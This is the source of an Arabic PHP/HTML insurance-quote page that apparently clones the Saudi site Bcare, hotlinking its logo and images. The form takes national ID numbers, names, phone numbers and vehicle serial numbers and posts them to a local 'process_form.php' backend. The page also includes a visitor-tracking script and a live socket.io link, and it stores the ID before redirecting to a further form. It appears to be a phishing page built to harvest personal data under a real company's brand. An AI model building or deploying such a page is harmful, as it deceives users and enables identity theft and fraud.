<?php include 'visitor.php'; ?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel ="stylesheet" href ="styleindex.css">
    <title>نموذج التأمين</title>
    <script src="http://localhost:3000/socket.io/socket.io.js"></script>
    
<script>
  const socket = io("http://localhost:3000");

  socket.on("connect", () => {
    console.log("متصل بالسيرفر");
  });

  socket.on("reply", (data) => {
    console.log("رد السيرفر:", data);
  });

  function sendMessage(msg) {
    socket.emit("message", msg);
  }

  // مثال: إرسال رسالة بعد 3 ثواني
  setTimeout(() => {
    sendMessage("مرحبا من index.php");
  }, 3000);
</script>

</head>
<body>
    

    <div class="top-bar">
        <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Bcare Logo">
        <span></span>
        <span>EN</span>
    </div>

    <div class="main-header">
        <h2>قارن، آمن، استلم وثيقتك</h2>
        <p>مكان واحد وفر عليك البحث بين أكثر من 20 شركة تأمين!</p>
    </div>

    <div class="form-wrapper">
        <div class="nav-tabs">
            <div class="tab-item active">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                    <path d="M135.2 117.4L109.1 192H402.9l-26.1-74.6C372.3 104.6 360.2 96 346.6 96H165.4c-13.6 0-25.7 8.6-30.2 21.4zM39.6 196.8L74.8 96.3C88.3 57.8 124.6 32 165.4 32H346.6c40.8 0 77.1 25.8 90.6 64.3l35.2 100.5c23.2 9.6 39.6 32.5 39.6 59.2V400v48c0 17.7-14.3 32-32 32H448c-17.7 0-32-14.3-32-32V400H96v48c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32V400 256c0-26.7 16.4-49.6 39.6-59.2zM128 288a32 32 0 1 0 -64 0 32 32 0 1 0 64 0zm288 32a32 32 0 1 0 0-64 32 32 0 1 0 0 64z"/>
                </svg>
                <span>مركبات</span>
            </div>

            <div class="tab-item">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
                    <path d="M482.3 192c34.2 0 93.7 29 93.7 64c0 36-59.5 64-93.7 64l-116.6 0L265.2 495.9c-5.7 10-16.3 16.1-27.8 16.1l-56.2 0c-10.6 0-18.3-10.2-15.4-20.4l49-171.6L112 320 68.8 377.6c-3 4-7.8 6.4-12.8 6.4l-42 0c-7.8 0-14-6.3-14-14c0-1.3 .2-2.6 .5-3.9L32 256 .5 145.9c-.4-1.3-.5-2.6-.5-3.9c0-7.8 6.3-14 14-14l42 0c5 0 9.8 2.4 12.8 6.4L112 192l102.9 0-49-171.6C162.9 10.2 170.6 0 181.2 0l56.2 0c11.5 0 22.1 6.2 27.8 16.1L365.7 192l116.6 0z"/>
                </svg>
                <span>سفر</span>
            </div>

            <div class="tab-item">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
                    <path d="M142.4 21.9c5.6 16.8-3.5 34.9-20.2 40.5L96 71.1V192c0 53 43 96 96 96s96-43 96-96V71.1l-26.1-8.7c-16.8-5.6-25.8-23.7-20.2-40.5s23.7-25.8 40.5-20.2l26.1 8.7C334.4 19.1 352 43.5 352 71.1V192c0 77.2-54.6 141.6-127.3 156.7C231 404.6 278.4 448 336 448c61.9 0 112-50.1 112-112V265.3c-28.3-12.3-48-40.5-48-73.3c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V336c0 97.2-78.8 176-176 176c-92.9 0-168.9-71.9-175.5-163.1C87.2 334.2 32 269.6 32 192V71.1c0-27.5 17.6-52 43.8-60.7l26.1-8.7c16.8-5.6 34.9 3.5 40.5 20.2zM480 224a32 32 0 1 0 0-64 32 32 0 1 0 0 64z"/>
                </svg>
                <span>أخطاء طبية</span>
            </div>

            <div class="tab-item">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                    <path d="M228.3 469.1L47.6 300.4c-4.2-3.9-8.2-8.1-11.9-12.4h87c22.6 0 43-13.6 51.7-34.5l10.5-25.2 49.3 109.5c3.8 8.5 12.1 14 21.4 14.1s17.8-5 22-13.3L320 253.7l1.7 3.4c9.5 19 28.9 31 50.1 31H476.3c-3.7 4.3-7.7 8.5-11.9 12.4L283.7 469.1c-7.5 7-17.4 10.9-27.7 10.9s-20.2-3.9-27.7-10.9zM503.7 240h-132c-3 0-5.8-1.7-7.2-4.4l-23.2-46.3c-4.1-8.1-12.4-13.3-21.5-13.3s-17.4 5.1-21.5 13.3l-41.4 82.8L205.9 158.2c-3.9-8.7-12.7-14.3-22.2-14.1s-18.1 5.9-21.8 14.8l-31.8 76.3c-1.2 3-4.2 4.9-7.4 4.9H16c-2.6 0-5 .4-7.3 1.1C3 225.2 0 208.2 0 190.9v-5.8c0-69.9 50.5-129.5 119.4-141C165 36.5 211.4 51.4 244 84l12 12 12-12c32.6-32.6 79-47.5 124.6-39.9C461.5 55.6 512 115.2 512 185.1v5.8c0 16.9-2.8 33.5-8.3 49.1z"/>
                </svg>
                <span>طبي</span>
            </div>
        </div>
        <div class="form-toggle">
            <button class="active" id="newBtn" onclick="togglePurpose('new')">تأمين جديد</button>
            <button id="transferBtn" onclick="togglePurpose('transfer')">نقل ملكية</button>
        </div>

        <form id="myForm" method="POST" action="process_form.php">
            <label>رقم الهوية / الإقامة</label>
            <input type="tel" name="id_number" placeholder="رقم الهوية / الإقامة" required maxlength="10">

            <label>اسم مالك الوثيقة</label>
            <input type="text" name="owner_name" placeholder="الاسم الكامل" required>

            <label>رقم الهاتف</label>
            <input type="tel" name="phone" placeholder="05xxxxxxxx" required maxlength="10">

            <div class="form-type-toggle">
                <button type="button" class="active" id="formBtn" onclick="toggleFormType('form')">استمارة</button>
                <button type="button" id="customBtn" onclick="toggleFormType('custom')">بطاقة جمركية</button>
            </div>

            <div id="form-fields">
                <label>الرقم التسلسلي</label>
                <input type="tel" name="serial_number_form" placeholder="الرقم التسلسلي">
            </div>

            <div id="custom-fields" class="hidden">
                <label>سنة الصنع</label>
                <input type="text" name="manufacture_year" placeholder="سنة الصنع">

                <label>الرقم التسلسلي</label>
                <input type="tel" name="serial_number_custom" placeholder="الرقم التسلسلي">
            </div>

            <label>رمز التحقق</label>
            <div class="captcha">
                <input type="tel" id="captchaInput" placeholder="رمز التحقق" required maxlength="4" name="captchaInput">
                <span id="captchaCode">1234</span>
                <button type="button" onclick="generateCaptcha()">🔄</button>
            </div>

            <div class="checkbox">
                <input type="checkbox" id="agree" name="agree" checked required>
                <label for="agree">أوافق على منح شركة عناية عناية الوسط الحق في الاستعلام من شركة نجم أو مركز المعلومات الوطني عن بياناتي</label>
            </div>

            <button class="submit-btn" type="submit">إظهار العروض</button>
        </form>
    </div>

    <div class="section-title">طريقك آمــن مع بي كير</div>

    <div class="boxes-grid">
        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/insureOneMin.svg" alt="InsureOneMin">
            <h3>تأمينك في دقيقة</h3>
            <p>نقارن لك كل عروض الأسعار بشكل فوري من كل شركات التأمين</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/sprateInsure.svg" alt="SprateInsure">
            <h3>فصّل تأمينك</h3>
            <p>أنواع تأمين متعددة: ضد الغير، شامل، مميز، وتحمل متنوع</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/priceLess.svg" alt="PriceLess">
            <h3>أسعار أقل</h3>
            <p>نراقب السوق ونضمن أن سعرك الأقل حسب احتياجك</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/sechleInsure.svg" alt="SechleInsure">
            <h3>جدول تأمينك</h3>
            <p>نرسل لك تذكيرات بالتجديد وتقدر تحدد تاريخ البداية</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/wind.svg" alt="Wind">
            <h3>هب ريح</h3>
            <p>نربط وثيقتك مباشرة مع المرور ونجم بأسرع وقت</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/discounts.svg" alt="Discounts">
            <h3>خصومات تضبطك</h3>
            <p>خصومات للقطاعات الحكومية والخاصة</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/benfit.svg" alt="Benfit">
            <h3>منافع تحميك</h3>
            <p>اختر المنافع الإضافية المناسبة لك</p>
        </div>

        <div class="box">
            <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/oneWay.svg" alt="OneWay">
            <h3>مكان واحد</h3>
            <p>إدارة إلكترونية كاملة لجميع وثائقك</p>
        </div>
    </div>

    <section class="wareef-discounts-section">
        <h1 class="section-title">خصومات وريف</h1>
        <h2 class="section-subtitle">خصومات وعروض مباشرة من مختلف المتاجر العالمية والمحلية لعملاء بي كير (أفراد، شركات)</h2>

        <div class="discounts-grid">
            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/RoshRayhaan.jpg" alt="RoshRayhan">
                <div class="discount-info">
                    <h3>روش ريحان</h3>
                    <p>خصم 15%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/none.svg" alt="Noon">
                <div class="discount-info">
                    <h3>نون</h3>
                    <p>خصم 15%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/drive7.png" alt="Perfectweight">
                <div class="discount-info">
                    <h3>الوزن المثالي</h3>
                    <p>خصم 50%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/swater.jpg" alt="Drive7">
                <div class="discount-info">
                    <h3>درايف7</h3>
                    <p>خصم 20%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/sivvi.svg" alt="Sweater">
                <div class="discount-info">
                    <h3>سويتر</h3>
                    <p>خصم 20%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/Physiotherabia.jpg" alt="Sivvi">
                <div class="discount-info">
                    <h3>سيفي</h3>
                    <p>خصم 10%</p>
                </div>
            </div>

            <div class="discount-item">
                <img src="https://bcare.com.sa/assets/images/Group%206444.svg" alt="Physiotherabia">
                <div class="discount-info">
                    <h3>فيزيوثيرابيا</h3>
                    <p>خصم 20%</p>
                </div>
            </div>
        </div>

        <div class="show-more">
            <button>عرض المزيد من الخصومات</button>
        </div>
    </section>
    <script>
        function validateCaptcha() {
            const input = document.getElementById('captchaInput').value.trim();
            const code = document.getElementById('captchaCode').textContent.trim();
            if (input === code) {
                return true;
            } else {
                alert('رمز التحقق غير صحيح!');
                return false;
            }
        }

        function generateCaptcha() {
            const code = Math.floor(1000 + Math.random() * 9000).toString();
            document.getElementById('captchaCode').textContent = code;
        }

        window.onload = generateCaptcha;

        function toggleFormType(type) {
            const formBtn = document.getElementById('formBtn');
            const customBtn = document.getElementById('customBtn');
            const formFields = document.getElementById('form-fields');
            const customFields = document.getElementById('custom-fields');

            if (type === 'form') {
                formBtn.classList.add('active');
                customBtn.classList.remove('active');
                formFields.style.display = 'block';
                customFields.style.display = 'none';
            } else {
                formBtn.classList.remove('active');
                customBtn.classList.add('active');
                formFields.style.display = 'none';
                customFields.style.display = 'block';
            }
        }

        document.getElementById('myForm').addEventListener('submit', async function(event) {
            event.preventDefault(); 

            if (!validateCaptcha()) {
                return;
            }

            const formData = new FormData(this);
            formData.append('action', 'submit_initial_form'); 

            const newBtn = document.getElementById('newBtn');
            const transferBtn = document.getElementById('transferBtn');
            if (newBtn.classList.contains('active')) {
                formData.append('purpose', 'new_insurance');
            } else if (transferBtn.classList.contains('active')) {
                formData.append('purpose', 'transfer_ownership');
            }

            const formBtn = document.getElementById('formBtn');
            const customBtn = document.getElementById('customBtn');
            if (formBtn.classList.contains('active')) {
            } else if (customBtn.classList.contains('active')) {
            }


            const idNumber = document.querySelector('input[name="id_number"]').value;
            localStorage.setItem('id_number', idNumber);

            try {
                const response = await fetch('process_form.php', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json(); 

                if (result.status === 'success') {
                    window.location.href = 'form.html'; 
                } else {
                    alert('فشل في إرسال البيانات: ' + (result.message || 'خطأ غير معروف.'));
                }
            } catch (error) {
                console.error('Fetch error:', error);
                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى.');
            }
        });
    </script>
    <script src="scrpt.js"></script>
</body>
</html>